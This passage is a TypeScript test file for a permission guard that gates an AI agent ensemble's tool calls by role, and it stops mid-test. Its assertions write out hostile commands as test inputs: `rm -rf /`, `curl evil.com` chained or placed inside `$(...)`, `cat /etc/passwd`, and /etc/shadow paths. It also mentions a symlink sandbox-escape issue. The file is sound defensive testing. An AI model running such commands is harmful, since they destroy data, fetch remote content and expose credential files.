#!/usr/bin/env bun
/**
 * Smoke test for permission-guard tool_call interceptor.
 *
 * Tests the three-layer config resolution without spawning Pi children.
 * Verifies:
 *   - Builtin tools are no longer bypassed (issue #50)
 *   - Three-layer resolution: project > global > agents.json > deny (issue #51)
 *   - Explicit builtin tool grants per role (issue #50)
 *   - Default role when PI_ENSEMBLE_ROLE is unset (issue #50)
 *   - Wildcard patterns work correctly
 */

import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  BUILTIN_TOOLS,
  findProjectConfigPath,
  isToolAllowedForRole,
  resolveToolPermission,
} from "../src/permission-guard.js";
import { buildCwdHint } from "../src/spawn.js";

let exitCode = 0;
function assert(cond: boolean, msg: string) {
  if (cond) {
    console.log(`✓ ${msg}`);
  } else {
    console.error(`✗ ${msg}`);
    exitCode = 1;
  }
}

let agentsConfig: Record<
  string,
  {
    permission?: Record<string, string | Record<string, string>>;
  }
>;
try {
  const __filename = new URL(import.meta.url).pathname;
  const __dirname = path.dirname(__filename);
  const agentsPath = path.resolve(__dirname, "..", "..", "agents.json");
  const agentsRaw = readFileSync(agentsPath, "utf8");
  const agentsParsed = JSON.parse(agentsRaw);
  agentsConfig = agentsParsed.agent ?? {};
} catch (err) {
  assert(false, `Failed to load agents.json: ${err}`);
  process.exit(1);
}

console.log("=== test-permission-guard summary ===\n");

// === Issue #50 tests ===

// Test 1: isToolAllowedForRole("edit", "ops") returns false
const editDeniedForOps = isToolAllowedForRole("edit", "ops", agentsConfig);
assert(!editDeniedForOps, "Issue #50: edit is denied for ops role");

// Test 2: isToolAllowedForRole("edit", "developer") returns true
const editAllowedForDev = isToolAllowedForRole("edit", "developer", agentsConfig);
assert(editAllowedForDev, "Issue #50: edit is allowed for developer role");

// Test 3: isToolAllowedForRole("read", "adversarial-developer") returns true
const readAllowedForAdv = isToolAllowedForRole("read", "adversarial-developer", agentsConfig);
assert(readAllowedForAdv, "Issue #50: read is allowed for adversarial-developer role");

// Test 4: isToolAllowedForRole("write", "adversarial-developer") returns false
const writeDeniedForAdv = isToolAllowedForRole("write", "adversarial-developer", agentsConfig);
assert(!writeDeniedForAdv, "Issue #50: write is denied for adversarial-developer role");

// Test 5: project-manager role allows read (was "default" pre-#104 — same
// semantics; default merged into project-manager)
const readAllowedForPM = isToolAllowedForRole("read", "project-manager", agentsConfig);
assert(readAllowedForPM, "Issue #50: read is allowed for project-manager role");

// Test 6: project-manager denies write
const writeDeniedForPM = isToolAllowedForRole("write", "project-manager", agentsConfig);
assert(!writeDeniedForPM, "Issue #50: write is denied for project-manager role");

// Test 7: All roles have explicit builtin tool grants (no bypass).
// Issue #104: removed "default" role — only 6 roles remain.
for (const role of [
  "project-manager",
  "developer",
  "ops",
  "code-review-specialist",
  "explore",
  "adversarial-developer",
]) {
  const readAllowed = isToolAllowedForRole("read", role, agentsConfig);
  assert(readAllowed, `Issue #50: read is explicitly allowed for ${role} (no bypass)`);
}

// Test 7b: querying the removed "default" role returns false (deny-by-default
// for unknown roles). This is the visible behaviour change from #104 — if any
// caller still passes role="default", it fails closed.
const defaultRoleRemoved = isToolAllowedForRole("read", "default", agentsConfig);
assert(!defaultRoleRemoved, "Issue #104: default role removed → unknown-role queries return false");

// Test 8: Wildcard patterns work correctly (live agents.json — was meadow* pre-codebase-memory-mcp).
// PM has `"parallel-search*": "deny"`; verify the wildcard matches an arbitrary suffix.
// We assert on resolveToolPermission (not isToolAllowedForRole) so we can distinguish
// "wildcard hit and returned deny" from "no rule matched and defaulted to ask/deny".
const parallelSearchVerdict = resolveToolPermission(
  "parallel-search_some_new_tool",
  "project-manager",
  {},
  {},
  agentsConfig,
);
assert(
  parallelSearchVerdict === "deny",
  "Issue #50: wildcard pattern works (parallel-search* matches arbitrary suffix for PM, resolves to deny)",
);

// Test 9: Explicit deny overrides wildcard (parallel-search_* denied for ops)
const parallelSearchDeniedForOps = isToolAllowedForRole(
  "parallel-search_web_search_preview",
  "ops",
  agentsConfig,
);
assert(
  !parallelSearchDeniedForOps,
  "Issue #50: explicit deny blocks parallel-search_web_search_preview for ops",
);

// Test 10: Tool not mentioned is denied (deny-by-default)
const unknownToolDeniedForDev = isToolAllowedForRole(
  "unknown_tool_12345",
  "developer",
  agentsConfig,
);
assert(!unknownToolDeniedForDev, "Issue #50: unknown tool denied for developer (deny-by-default)");

// === Issue #51 tests: three-layer resolution ===

const emptyProject: {
  roles: Record<string, { permission?: Record<string, "allow" | "deny" | "ask"> }>;
} = { roles: {} };
const emptyGlobal: typeof emptyProject = { roles: {} };

// Test 11: Project config overrides agents.json
const projectOverride: typeof emptyProject = {
  roles: {
    developer: {
      permission: {
        unknown_tool_12345: "allow", // Override deny-by-default
      },
    },
  },
};
const verdict11 = resolveToolPermission(
  "unknown_tool_12345",
  "developer",
  projectOverride.roles,
  emptyGlobal.roles,
  agentsConfig,
);
assert(verdict11 === "allow", "Issue #51: project config overrides agents.json (allow)");

const projectDenyOverride: typeof emptyProject = {
  roles: {
    developer: {
      permission: {
        edit: "deny", // Override agents.json allow
      },
    },
  },
};
const verdict11b = resolveToolPermission(
  "edit",
  "developer",
  projectDenyOverride.roles,
  emptyGlobal.roles,
  agentsConfig,
);
assert(verdict11b === "deny", "Issue #51: project config overrides agents.json (deny)");

// Test 12: Global config applies when no project entry
const globalConfig: typeof emptyProject = {
  roles: {
    developer: {
      permission: {
        another_unknown_tool: "allow",
      },
    },
  },
};
const verdict12 = resolveToolPermission(
  "another_unknown_tool",
  "developer",
  emptyProject.roles,
  globalConfig.roles,
  agentsConfig,
);
assert(verdict12 === "allow", "Issue #51: global config applies when no project entry");

// Test 13: agents.json applies when no global or project entry
const verdict13 = resolveToolPermission(
  "read",
  "developer",
  emptyProject.roles,
  emptyGlobal.roles,
  agentsConfig,
);
assert(verdict13 === "allow", "Issue #51: agents.json applies when no global or project entry");

// Test 14: Missing config files handled silently (empty objects)
const verdict14 = resolveToolPermission(
  "read",
  "developer",
  {}, // Missing project config
  {}, // Missing global config
  agentsConfig,
);
assert(verdict14 === "allow", "Issue #51: missing config files handled silently");

// Test 15: Wildcard patterns in project config
const projectWildcard: typeof emptyProject = {
  roles: {
    developer: {
      permission: {
        "test_*": "allow",
      },
    },
  },
};
const verdict15 = resolveToolPermission(
  "test_foo_bar",
  "developer",
  projectWildcard.roles,
  emptyGlobal.roles,
  agentsConfig,
);
assert(verdict15 === "allow", "Issue #51: wildcard pattern in project config works");

// Test 16: Exact match takes precedence over wildcard in same layer
const projectOrder: typeof emptyProject = {
  roles: {
    developer: {
      permission: {
        "test_*": "deny",
        test_specific: "allow",
      },
    },
  },
};
const verdict16a = resolveToolPermission(
  "test_specific",
  "developer",
  projectOrder.roles,
  emptyGlobal.roles,
  agentsConfig,
);
assert(verdict16a === "allow", "Issue #51: exact match in project config overrides wildcard");

const verdict16b = resolveToolPermission(
  "test_other",
  "developer",
  projectOrder.roles,
  emptyGlobal.roles,
  agentsConfig,
);
assert(verdict16b === "deny", "Issue #51: wildcard in project config catches non-exact matches");

// Test 17: Project exact match, then project wildcard, then global exact, then global wildcard
const layeredTest: typeof emptyProject = {
  roles: {
    developer: {
      permission: {
        "layered_*": "deny",
        layered_exact: "deny",
      },
    },
  },
};
const globalTest: typeof emptyProject = {
  roles: {
    developer: {
      permission: {
        "layered_*": "allow",
        layered_global_only: "allow",
      },
    },
  },
};
const verdict17a = resolveToolPermission(
  "layered_exact",
  "developer",
  layeredTest.roles,
  globalTest.roles,
  agentsConfig,
);
assert(verdict17a === "deny", "Issue #51: project exact match beats project wildcard");

const verdict17b = resolveToolPermission(
  "layered_other",
  "developer",
  layeredTest.roles,
  globalTest.roles,
  agentsConfig,
);
assert(verdict17b === "deny", "Issue #51: project wildcard beats global exact/wildcard");

const verdict17c = resolveToolPermission(
  "layered_global_only",
  "developer",
  emptyProject.roles,
  globalTest.roles,
  agentsConfig,
);
assert(verdict17c === "allow", "Issue #51: global exact/wildcard beats agents.json");

// === Issue #96 tests: PM bare git allowlist ===
// Short-output git reads should be allowed bare; oo-wrapped equivalents are
// no longer redundantly granted (single source of truth per command).

const bareGitAllowed = [
  "git status",
  "git status --short",
  "git branch --show-current",
  "git worktree list",
  "git rev-parse HEAD",
  "git merge-base main HEAD",
  "git remote -v",
  "git tag --list",
  "git config --get user.email",
];
for (const command of bareGitAllowed) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(v === "allow", `Issue #96: bare \`${command}\` is allowed for project-manager`);
}

// Verbose-output git commands still require oo wrapper
const ooGitAllowed = [
  "oo git log --oneline -10",
  "oo git diff HEAD~1",
  "oo git show HEAD",
  "oo git shortlog -sn",
  "oo git rev-list --count HEAD",
  "oo git for-each-ref refs/heads",
];
for (const command of ooGitAllowed) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(v === "allow", `Issue #96: \`${command}\` is allowed for project-manager`);
}

// Now-redundant oo-wrapped variants of short commands are NOT in the allowlist
// (forces the bare canonical pattern). Bash catch-all migrated from `deny`
// to `ask` (closing #169's gap on the nested bash block) — these prompt the
// user rather than hard-denying. The bare canonical form is still the
// recommended idiom; the prompt is the safety net for novel inputs.
const ooGitAsked = [
  "oo git status",
  "oo git branch --show-current",
  "oo git worktree list",
  "oo git rev-parse HEAD",
];
for (const command of ooGitAsked) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #96: \`${command}\` prompts the user for project-manager (use bare form to skip prompt)`,
  );
}

// Write/mutation bash now prompts the user instead of hard-denying. Defense
// in depth for true injection vectors (`&&`, `|`, `$()`, redirects) is still
// hard-deny via matchBashSubcommand's injection check — see chainedShouldDeny
// below.
const bashAsked = ["git push origin main", "git commit -m foo", "rm -rf /"];
for (const command of bashAsked) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(v === "ask", `Issue #96: \`${command}\` prompts the user for project-manager`);
}

// Issue #104: `default` role removed. Calling resolveToolPermission with
// role="default" finds no role config → falls through to "ask" (not "allow").
// Parent Pi sessions now resolve to project-manager directly via the
// permission-guard fallback.
for (const command of ["git status", "git branch", "oo git log"]) {
  const v = resolveToolPermission("bash", "default", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #104: \`${command}\` for removed role 'default' falls through to ask (got: ${v})`,
  );
}

// === Issue #99 tests: PM ticket lifecycle direct via gh ===
// Bare gh for ticket CRUD (oo wrapping breaks gh issue / gh api | jq usage).

const ghIssueAllowed = [
  "gh issue create -t 'foo' -b 'bar'",
  "gh issue list --limit 15",
  "gh issue list --state open --label bug",
  "gh issue view 123",
  "gh issue view 123 -R randomm/pi-ensemble",
  "gh issue edit 123 --add-label triaged",
  "gh issue close 123",
  "gh issue reopen 123",
  "gh issue comment 123 -b 'thx'",
  "gh search issues 'is:open author:janni'",
  "gh api repos/randomm/pi-ensemble/issues/123",
];
for (const command of ghIssueAllowed) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(v === "allow", `Issue #99: \`${command}\` is allowed for project-manager`);
}

// PR mutations + CI re-runs prompt the user (ops territory — PM shouldn't
// do these silently, but per the post-#169 catch-all migration the user
// is in the loop rather than hard-blocked).
const ghOpsAsked = [
  "gh pr create",
  "gh pr merge 42",
  "gh pr close 42",
  "gh pr edit 42",
  "gh run rerun 12345",
];
for (const command of ghOpsAsked) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #99: \`${command}\` prompts the user for project-manager (ops territory)`,
  );
}

// Ghost `issue` / `pr` / `ci` tool grants are gone — those tool names resolve
// to "ask" (no explicit rule) rather than "allow" (which would prove the ghost
// grant survived the cleanup).
for (const ghostTool of ["issue", "pr", "ci"]) {
  for (const role of ["project-manager", "developer", "ops", "code-review-specialist", "explore"]) {
    const v = resolveToolPermission(ghostTool, role, {}, {}, agentsConfig);
    assert(
      v !== "allow",
      `Issue #99: ghost \`${ghostTool}\` permission removed from ${role} role (current verdict: ${v})`,
    );
  }
}

// === Issue #102 tests: PM read-only PR / CI inspection ===
// /start step 4 now runs in PM directly instead of dispatching to ops.

const ghPrCiReadAllowed = [
  "gh pr list",
  "gh pr list --state open",
  "gh pr view 42",
  "gh run list --branch main --limit 3",
  "gh run view 12345",
  "gh run watch 12345",
];
for (const command of ghPrCiReadAllowed) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(v === "allow", `Issue #102: read-only \`${command}\` is allowed for project-manager`);
}

// PR / CI mutations prompt the user for PM — see ghOpsAsked above for the
// reasoning behind the catch-all `deny` → `ask` migration.
const ghPrCiMutationAsked = [
  "gh pr create -t foo -b bar",
  "gh pr merge 42",
  "gh pr close 42",
  "gh pr edit 42 --add-label triaged",
  "gh pr ready 42",
  "gh run rerun 12345",
];
for (const command of ghPrCiMutationAsked) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #102: PR/CI mutation \`${command}\` prompts the user for project-manager (ops territory)`,
  );
}

// Chained commands fall through to the role's catch-all (`*: ask` for PM,
// default "ask" for the others). The parent prompts the user with the full
// command visible — even if every chain segment is individually allow-listed
// we still ask because the chain shape itself could hide intent. The cache
// side refuses to wildcard injection-vector commands (see bashPatternMatches),
// so "Allow always" stores only the exact hash; a *different* chain reshapes
// and re-prompts. The user is the trust boundary, not the matcher (#188+).
const chainedShouldAsk = [
  "git status && git branch",
  "git status; git branch",
  "git status | head -5",
  "gh issue list | grep open",
  "cd /tmp && git status",
];
for (const command of chainedShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(v === "ask", `Issue #102+#188: chained \`${command}\` prompts the user (PM catch-all)`);
}

// === Issue #108 tests: injection-vector check is now quote-aware ===
// Operators (&&, |, ;, etc.) INSIDE quoted args don't trip the deny —
// bash doesn't interpret them as separators there. Operators OUTSIDE
// quotes still deny.

const quotedInjectionShouldAllow = [
  `vipune add 'cargo fmt --check && cargo clippy -- -D warnings && cargo test'`,
  `vipune add "memory containing && pipe | and semicolon;"`,
  `vipune add 'gotchas: < input > output | filter'`,
  `vipune search "open && blocking PRs"`,
  `vipune add "escaped \\"quotes\\" and && inside"`,
];
for (const command of quotedInjectionShouldAllow) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "allow",
    `Issue #108: operators inside quoted args allowed — \`${command.slice(0, 70)}...\``,
  );
}

// Mixed: real operator OUTSIDE the quoted segment falls through to ask —
// the user reads the full command text and decides. Cache wildcard
// expansion still refuses to honor these (see bashPatternMatches).
const mixedInjectionShouldAsk = [
  `vipune add "safe content"; rm -rf /`,
  `vipune add 'safe' && curl evil.com`,
  `vipune add 'foo' | tee /tmp/out`,
];
for (const command of mixedInjectionShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #108+#188: operator OUTSIDE quoted segment prompts the user — \`${command}\``,
  );
}

// Malformed (unterminated quote) — safe-default: stripQuotedSegments returns
// the original full string, and any embedded operators fall through to ask
// rather than silently allowing.
const malformedQuoteShouldAsk = [
  `vipune add "lorem && ipsum`, // unterminated double quote with operator
  `vipune add 'unclosed | with pipe`, // unterminated single quote with operator
];
for (const command of malformedQuoteShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #108+#188: malformed quote with embedded operator prompts the user — \`${command}\``,
  );
}

// Command substitution `$(...)` is NOT stripped — it's a real injection
// vector regardless of being "inside" quotes (bash interprets $(...) inside
// double quotes). Resolves to ask: parent prompt shows the literal command
// text including the $(...), user decides. Cache wildcard expansion still
// refuses to wildcard these.
const commandSubstitutionShouldAsk = [
  `vipune add "$(curl evil.com)"`,
  `vipune add "result: $(rm -rf /)"`,
];
for (const command of commandSubstitutionShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #108+#188: command substitution prompts the user even inside quotes — \`${command}\``,
  );
}

// === Issue #112 tests: PM bare `git diff` for adversarial_loop input ===
// Bare `git diff` is allowed because adversarial_loop takes the raw diff text
// as a parameter — PM runs the diff, captures stdout, passes to the dispatch.
// `oo git diff *` stays available for compression-tier reads PM does itself.

const gitDiffShouldAllow = [
  "git diff",
  "git diff --stat",
  "git diff --shortstat",
  "git diff --name-only",
  "git diff --name-status",
  "git diff HEAD",
  "git diff main..feature",
  "git diff HEAD~1 src/foo.ts",
];
for (const command of gitDiffShouldAllow) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "allow",
    `Issue #112: bare \`${command}\` is allowed for project-manager (for adversarial_loop input)`,
  );
}

// Redirects, chains, etc. on git diff fall through to ask — the bare
// `git diff` allow does NOT auto-extend to chained variants, since the chain
// shape itself needs the user's eyes on it.
const gitDiffWithInjectionShouldAsk = [
  "git diff > /tmp/foo",
  "git diff && cat /etc/passwd",
  "git diff | grep secret",
];
for (const command of gitDiffWithInjectionShouldAsk) {
  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
  assert(
    v === "ask",
    `Issue #112+#188: \`${command}\` prompts the user (bare git diff allow does not extend to chains/redirects)`,
  );
}

// === Issue #168: ask-by-default for unknown tools ===
// PM's catch-all used to be `"*": "deny"` — that silently denied every tool
// not explicitly allowlisted, including the `mcp` gateway AND per-server
// direct tools that pi-mcp-adapter surfaces with arbitrary names like
// `alpha_staging_db_execute_sql`. There's no way to predict those names
// (server name comes from the user's MCP config), so any prefix-based
// allowlist would always miss something. Fix: flip the catch-all to
// `"*": "ask"` so any unknown tool prompts. "Allow always" persists
// per-project ($PWD/.pi/decisions.json), so cleanup is one prompt per
// project per tool.

// MCP gateway tool — explicit entries now exist per role (post codebase-memory-mcp
// adoption). PM owns admin calls so its `mcp` is `allow`; specialists are `ask`.
const mcpVerdictPM = resolveToolPermission("mcp", "project-manager", {}, {}, agentsConfig);
assert(mcpVerdictPM === "allow", "PM has explicit `mcp: allow` (owns first-run index_repository)");

const mcpVerdictDev = resolveToolPermission("mcp", "developer", {}, {}, agentsConfig);
assert(mcpVerdictDev === "ask", "Specialists have explicit `mcp: ask` (prompts for admin calls)");

// Per-server direct tools (arbitrary names from user's MCP config).
const directDbTool = resolveToolPermission(
  "alpha_staging_db_execute_sql",
  "project-manager",
  {},
  {},
  agentsConfig,
);
assert(
  directDbTool === "ask",
  "Issue #168: `alpha_staging_db_execute_sql` (per-server direct tool) resolves to ask for PM",
);

const mcpUnderscore = resolveToolPermission(
  "mcp_postgres",
  "project-manager",
  {},
  {},
  agentsConfig,
);
assert(mcpUnderscore === "ask", "Issue #168: `mcp_postgres` resolves to ask for PM");

// Any unknown tool — the prompt is the security boundary now, not silent deny.
const unknownVerdictPM = resolveToolPermission(
  "some_random_tool",
  "project-manager",
  {},
  {},
  agentsConfig,
);
assert(
  unknownVerdictPM === "ask",
  "Issue #168: any unknown tool resolves to ask for PM (catch-all = ask)",
);

// Explicit allows still take precedence over catch-all.
const explicitAllow = resolveToolPermission("read", "project-manager", {}, {}, agentsConfig);
assert(explicitAllow === "allow", "Issue #168: explicit `read: allow` still beats `*: ask`");

// Explicit denies still take precedence over catch-all.
const explicitDeny = resolveToolPermission("write", "project-manager", {}, {}, agentsConfig);
assert(explicitDeny === "deny", "Issue #168: explicit `write: deny` still beats `*: ask`");

// Wildcard precedence (the lookupPermission ordering fix from this PR):
// longest prefix wins, then `"*"` catch-all. Without the fix, `"*"` matched
// first on iteration order regardless of specificity.
const synthetic = {
  "project-manager": {
    permission: {
      "*": "ask",
      "dangerous_*": "deny",
      "dangerous_but_safe_*": "allow",
    },
  },
};
const longer = resolveToolPermission(
  "dangerous_but_safe_read",
  "project-manager",
  {},
  {},
  synthetic,
);
assert(
  longer === "allow",
  "Issue #168: longer prefix `dangerous_but_safe_*` beats shorter `dangerous_*`",
);
const shorter = resolveToolPermission("dangerous_op", "project-manager", {}, {}, synthetic);
assert(
  shorter === "deny",
  "Issue #168: shorter prefix `dangerous_*` fires when longer does not match",
);
const fallthrough = resolveToolPermission(
  "totally_unrelated",
  "project-manager",
  {},
  {},
  synthetic,
);
assert(fallthrough === "ask", "Issue #168: catch-all `*: ask` fires when no wildcard matches");

// === L7 (PR #192): findProjectConfigPath walks up from cwd ===
// User behaviour: place `.pi/permissions.json` at the repo root and expect it
// to apply when pi runs in any subdirectory (or any worktree subagent spawned
// with `cwd=<worktree>`). Mirrors git's `.git` ancestor search.
{
  const tmpRoot = mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-walkup-"));
  try {
    const repoRoot = path.join(tmpRoot, "fake-repo");
    const piDir = path.join(repoRoot, ".pi");
    const overlayPath = path.join(piDir, "permissions.json");
    const nestedDir = path.join(repoRoot, "src", "sub", "deeper");
    mkdirSync(nestedDir, { recursive: true });
    mkdirSync(piDir, { recursive: true });
    writeFileSync(overlayPath, JSON.stringify({ roles: { developer: { permission: { "mcp*": "allow" } } } }));

    // Walks up from a nested dir
    const walkedUp = findProjectConfigPath(nestedDir);
    assert(
      walkedUp === overlayPath,
      `L7: findProjectConfigPath walks up from nested dir to repo root (got: ${walkedUp})`,
    );

    // Returns null when no overlay anywhere in ancestry
    const noOverlayTmp = mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-no-overlay-"));
    try {
      const noOverlayResult = findProjectConfigPath(noOverlayTmp);
      assert(
        noOverlayResult === null,
        `L7: findProjectConfigPath returns null when no .pi/permissions.json in ancestry (got: ${noOverlayResult})`,
      );
    } finally {
      rmSync(noOverlayTmp, { recursive: true, force: true });
    }
  } finally {
    rmSync(tmpRoot, { recursive: true, force: true });
  }
}

// === L7 (PR #192): subagent guard now honors project + global overlays ===
// Pre-#192 the subagent guard stubbed projectConfig + globalConfig to `{}`,
// so a user's `.pi/permissions.json` like
//   { "roles": { "developer": { "permission": { "mcp*": "allow" } } } }
// was silently ignored. The subagent flow now resolves overlays the same
// way the parent does. We exercise the resolution function with a
// synthesized overlay because the runtime overlay load is a side-effect
// (file I/O) — what matters is that the verdict resolver applies it.
{
  const subagentAgentsConfig: Record<
    string,
    { permission?: Record<string, string | Record<string, string>> }
  > = {
    developer: {
      permission: {
        // baseline denies a wildcard the user wants to grant
        "mcp*": "deny",
      },
    },
  };
  const subagentProjectOverlay: typeof subagentAgentsConfig = {
    developer: {
      permission: {
        // user grants it in the project overlay
        "mcp*": "allow",
      },
    },
  };
  const subagentResolved = resolveToolPermission(
    "mcp__playwright__browser_navigate",
    "developer",
    subagentProjectOverlay,
    {},
    subagentAgentsConfig,
  );
  assert(
    subagentResolved === "allow",
    "L7: project overlay (developer mcp*: allow) overrides baseline deny — applies in subagents too post-#192",
  );

  // Global overlay also takes effect
  const subagentGlobalOverlay: typeof subagentAgentsConfig = {
    developer: {
      permission: {
        "mcp*": "allow",
      },
    },
  };
  const subagentGlobalResolved = resolveToolPermission(
    "mcp__playwright__browser_navigate",
    "developer",
    {},
    subagentGlobalOverlay,
    subagentAgentsConfig,
  );
  assert(
    subagentGlobalResolved === "allow",
    "L7: global overlay also overrides baseline deny in subagents",
  );
}

// === L4 (PR #192): buildCwdHint emits a concrete runtime context line ===
// When PM dispatches with `cwd: <path>`, spawn.ts prepends a runtime hint
// containing the absolute path. Weak models can't ignore a concrete path
// the way they can ignore generic "do not cd" doctrine.
{
  const noCwd = buildCwdHint(undefined);
  assert(noCwd === "", "L4: buildCwdHint returns empty string when cwd is undefined");

  const withCwd = buildCwdHint("/Users/dev/projects/lantern/.worktrees/issue-482");
  assert(
    withCwd.includes("/Users/dev/projects/lantern/.worktrees/issue-482"),
    "L4: buildCwdHint embeds the literal cwd path",
  );
  assert(
    withCwd.startsWith("[runtime context:"),
    "L4: buildCwdHint is recognizable as a runtime-context line",
  );
  assert(
    withCwd.includes("Do NOT 'cd'"),
    "L4: buildCwdHint carries the no-cd instruction",
  );
  assert(
    withCwd.includes("git -C") && withCwd.includes("--manifest-path") && withCwd.includes("--prefix"),
    "L4: buildCwdHint lists the cd-replacement tool flags",
  );
  assert(withCwd.endsWith("\n\n"), "L4: buildCwdHint terminates with blank line so prompt body starts cleanly");
}

// === L8 (PR #197): sandbox-mode short-circuits permission gating ===
// When PI_ENSEMBLE_SANDBOX_MODE=1, registerPermissionGuard and
// registerSubagentGuard return immediately without installing any tool_call
// handler. The container fence becomes the trust boundary. Tested by
// observing the registration is a no-op: pi-ensemble's `tool_call`
// listener list doesn't grow when we re-register with sandbox mode on.
{
  // Minimal fake ExtensionAPI that captures handler registrations.
  const handlers: Array<{ event: string; fn: unknown }> = [];
  const fakeApi = {
    on: (event: string, fn: unknown) => {
      handlers.push({ event, fn });
    },
  } as unknown as Parameters<typeof import("../src/permission-guard.js").registerPermissionGuard>[0];

  // Save + clear the env, run with sandbox mode on, verify zero handlers
  // got registered. Restore env afterwards.
  const prev = process.env.PI_ENSEMBLE_SANDBOX_MODE;
  process.env.PI_ENSEMBLE_SANDBOX_MODE = "1";
  try {
    const { registerPermissionGuard } = await import("../src/permission-guard.js");
    handlers.length = 0;
    registerPermissionGuard(fakeApi);
    const toolCallHandlers = handlers.filter((h) => h.event === "tool_call");
    assert(
      toolCallHandlers.length === 0,
      "L8: PI_ENSEMBLE_SANDBOX_MODE=1 short-circuits registerPermissionGuard — no tool_call handler registered",
    );

    // session_start is also a guard concern (decisions cache load).
    // Sandbox mode short-circuits before that's registered.
    const sessionStartHandlers = handlers.filter((h) => h.event === "session_start");
    assert(
      sessionStartHandlers.length === 0,
      "L8: PI_ENSEMBLE_SANDBOX_MODE=1 also skips session_start handler (no decisions cache load)",
    );
  } finally {
    if (prev === undefined) delete process.env.PI_ENSEMBLE_SANDBOX_MODE;
    else process.env.PI_ENSEMBLE_SANDBOX_MODE = prev;
  }
}

// === L8 (PR #197): sandbox-fs-guard rejects out-of-workspace paths ===
// CVE-2026-39861 class: symlink at /workspace/escape → /etc lets sandboxed
// agents read host config. sandbox-fs-guard canonicalises path arguments
// (`path` / `file_path` / `cwd` / `dir` / `target` / `filepath`) and rejects
// resolved paths outside /workspace.
{
  const { checkSandboxFsArgs } = await import("../src/sandbox-fs-guard.js");

  // FS-agnostic tools always pass.
  assert(
    checkSandboxFsArgs("websearch", { query: "/etc/passwd" }).ok === true,
    "L8: sandbox-fs-guard: FS-agnostic tools (websearch) skip the path check entirely",
  );
  assert(
    checkSandboxFsArgs("vipune", { query: "/etc/passwd" }).ok === true,
    "L8: sandbox-fs-guard: vipune tool skips the path check",
  );

  // Relative paths inside /workspace pass.
  assert(
    checkSandboxFsArgs("read", { path: "src/index.ts" }).ok === true,
    "L8: sandbox-fs-guard: relative paths permitted (resolve to /workspace via cwd)",
  );

  // Absolute paths outside /workspace are blocked.
  const blocked = checkSandboxFsArgs("read", { path: "/etc/passwd" });
  assert(
    blocked.ok === false,
    "L8: sandbox-fs-guard: absolute path /etc/passwd rejected",
  );
  if (!blocked.ok) {
    assert(
      blocked.reason.includes("outside the sandbox workspace"),
      "L8: sandbox-fs-guard: rejection carries a clear reason",
    );
  }

  // file_path / cwd / dir / target are all checked, not just `path`.
  for (const key of ["file_path", "cwd", "dir", "target", "filepath"]) {
    const v = checkSandboxFsArgs("write", { [key]: "/etc/shadow" });
    assert(
      v.ok === false,
      `L8: sandbox-fs-guard: ${key} argument also gets canonicalised + checked`,
    );
  }

  // Unknown path-arg keys are NOT checked (avoid false positives on tool
  // calls that happen to have a `name: "/etc/foo"` string field).
  assert(
    checkSandboxFsArgs("read", { name: "/etc/passwd" }).ok === true,
    "L8: sandbox-fs-guard: unknown argument keys are not auto-checked (only well-known FS keys)",
  );
}

// === PR #207: sandbox-fs-guard reads PI_ENSEMBLE_WORKSPACE_ROOT env var ===
// The wrapper now mounts the project at its host absolute path (e.g.
// /Users/dev/projects/lantern) instead of /workspace. The guard's
// boundary check must follow — read the env var, fall back to /workspace
// for raw `docker run` users without the wrapper.
//
// Use mkdtempSync to get a real non-symlinked dir for the boundary
// (macOS /tmp is a symlink to /private/tmp, which trips realpath
// resolution and defeats the prefix-match test).
{
  const { checkSandboxFsArgs } = await import("../src/sandbox-fs-guard.js");

  const root = realpathSync(mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-fs-guard-")));
  const inside = path.join(root, "some-file");
  // Sibling dir with overlapping prefix to test separator-boundary
  const sibling = `${root}-elsewhere`;
  mkdirSync(sibling, { recursive: true });

  const prev = process.env.PI_ENSEMBLE_WORKSPACE_ROOT;
  try {
    process.env.PI_ENSEMBLE_WORKSPACE_ROOT = root;

    // Inside the new boundary → permitted.
    const insideOk = checkSandboxFsArgs("read", { path: inside });
    assert(
      insideOk.ok === true,
      `PR #207: PI_ENSEMBLE_WORKSPACE_ROOT honored — inside-root path permitted (root=${root}, candidate=${inside})`,
    );

    // Outside the new boundary → rejected.
    const outside = checkSandboxFsArgs("read", { path: "/etc/passwd" });
    assert(
      outside.ok === false,
      "PR #207: PI_ENSEMBLE_WORKSPACE_ROOT honored — /etc/passwd rejected",
    );
    if (!outside.ok) {
      assert(
        outside.reason.includes(root),
        "PR #207: rejection reason names the active workspace root",
      );
    }

    // Separator-boundary check — a sibling dir sharing root's prefix
    // ("/.../pi-ensemble-fs-guard-XXX-elsewhere") should NOT be inside
    // the root.
    const tokenBoundary = checkSandboxFsArgs("read", { path: path.join(sibling, "foo") });
    assert(
      tokenBoundary.ok === false,
      "PR #207: separator boundary respected — sibling-with-prefix is NOT inside root",
    );
